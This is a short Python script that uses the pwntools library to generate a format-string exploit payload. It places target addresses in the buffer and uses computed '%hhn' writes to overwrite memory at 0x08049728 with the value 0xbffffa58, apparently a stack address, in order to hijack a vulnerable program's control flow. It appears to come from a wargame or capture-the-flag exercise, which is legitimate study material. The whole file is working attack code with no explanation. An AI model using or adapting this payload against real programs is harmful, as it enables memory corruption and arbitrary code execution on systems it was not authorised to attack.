#!/usr/bin/python

from pwn import *

what = 0xbffffa58
where = 0x08049728
buf = ""

for i in range(4):
	buf+=p32(where+i)
	buf+=chr(0x41+i)*4
	
buf+='%c'*8

o=4*8+8

for i in p32(what):
	cur = ord(i)
	if cur + 1 <= o % 256:
		cur += 256

	

	cur -= o % 256
	buf += '%'
	buf += '%06d'%cur
	buf += 'c%hhn'
	
	o += cur


print repr(buf)
